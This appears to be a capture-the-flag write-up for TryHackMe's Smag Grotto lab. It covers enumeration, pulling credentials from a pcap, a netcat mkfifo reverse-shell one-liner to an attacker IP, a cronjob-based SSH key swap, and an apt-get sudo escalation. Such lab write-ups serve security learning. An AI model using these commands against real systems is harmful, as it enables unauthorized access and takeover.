---
title: "Smag Grotto - TryHackMe"
category: "THM"
pubDate: 2020-07-30
description: "Writeup for the Smag Grotto university of Portsmouth's beginner room"
---
[TryHackMe | Smag Grotto](https://tryhackme.com/room/smaggrotto)

Deploy the machine and get root privileges.

---

### Setup

```
[smaggrotto] nmap -A 10.10.192.6                                                                                         2:01:00
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.3K  2020-06-05 10:56  admin.php
| 1.5K  2020-06-05 10:45  login.php
| 139K  2020-06-05 10:19  materialize.min.css
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://i.imgur.com/D9PypUN.png)

Let's see if there is something on the website

![](https://i.imgur.com/aXIQi2Y.png)

Well nothing of the website let's see of there is some hidden dirrectory with gobuster/dirb

```
# Select your own wordlist
[smaggrotto] gobuster -u 10.10.192.6 -w /opt/directory-list-2.3-medium.txt
```

```
Gobuster v1.3                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.192.6/
[+] Threads      : 10
[+] Wordlist     : /opt/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/mail (Status: 301)
```

![](https://i.imgur.com/V1XUxTY.png)

![](https://i.imgur.com/UZZG0pk.png)

Nice there is something interesting on this webpage let's download the pcap (wireshark) file and extract the juicy data 👀

![](https://i.imgur.com/FZ4Kz25.png)

The simple way to extract the data is to select the first packet then go to the "Analyse" tab the click on the "Follow" then "TCP Stream"

![](https://i.imgur.com/yKY9pMB.png)

![](https://i.imgur.com/RR1fGLX.png)

Nice we successfully have the username and the password but for what ? The SSH ? Or something else ? 🙄

Before trying the SSH connection with those credentials, you can see on the TCP Stream there is a Host : "development.smag.thm", let's take a look to this link.

To add this host you need to edit your "/etc/hosts" file.

![](https://i.imgur.com/Q5KPLgs.png)

![](https://i.imgur.com/FLbTQw7.png)

Well let's use the credentials that the TCP Stream gives us

```
h[nope 👁👄👁]k:cH[nope 👁👄👁]0w
```

![](https://i.imgur.com/L0iBMqp.png)

Nice, we can execute remote command let's try a reverse shell 🤩

![](https://i.imgur.com/UJiq34Y.png)

(This is actually my own chrome extension to generate some reverse shell and more..)

[LasCC/Hack-Tools](https://github.com/LasCC/Hack-Tools)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.28.116 1337 >/tmp/f
```

![](https://i.imgur.com/4pVmO2j.png)

Nice we have a reverse shell, let's see if we can have the first flag 🏅

![](https://i.imgur.com/i1MkJLx.png)

As you can see we don't have the permission to see the content of the file let's upload LinEnum to see if there is some potential attacks that we can perform.

![](https://i.imgur.com/G9PaoMF.png)

Ah, I found something very interesting with the cronjob

![](https://i.imgur.com/MkUFU4L.png)

As you can see the cronjob is taking the jake's backup SSH public key and add it to the authorised keys, if we create our own key and modify the backup file we can access the server ☺️

First let's generate our own SSH public key 👍

```
[smaggrotto] ssh-keygen -o
```

![](https://i.imgur.com/kXjks3E.png)

Nice we have our own SSH public key let's change the backup file on the server 👍

![](https://i.imgur.com/Q7IGUeR.png)

Now let's wait one or two minutes and then we can log to the server with the jake username 😀

```
[smaggrotto] ssh -i [Path to your ssh key] jake@10.10.192.6
```

![](https://i.imgur.com/hEeAJH6.png)

And voilà ! You have the access to the remote server ! 🎉

### **#1 What is the user flag?**

```
iusGo[nope 👁👄👁]uqU3j
```

![](https://i.imgur.com/5xn3kch.png)

### **#2 What is the root flag?**

Now let's get a root access 😍

![](https://i.imgur.com/TcRPpC7.png)

![](https://i.imgur.com/9sh8unG.png)

[apt get | GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo)

![](https://i.imgur.com/iDrkgGN.png)

```
uJr6zRgetan[nope 👁👄👁]bBKz2T
```


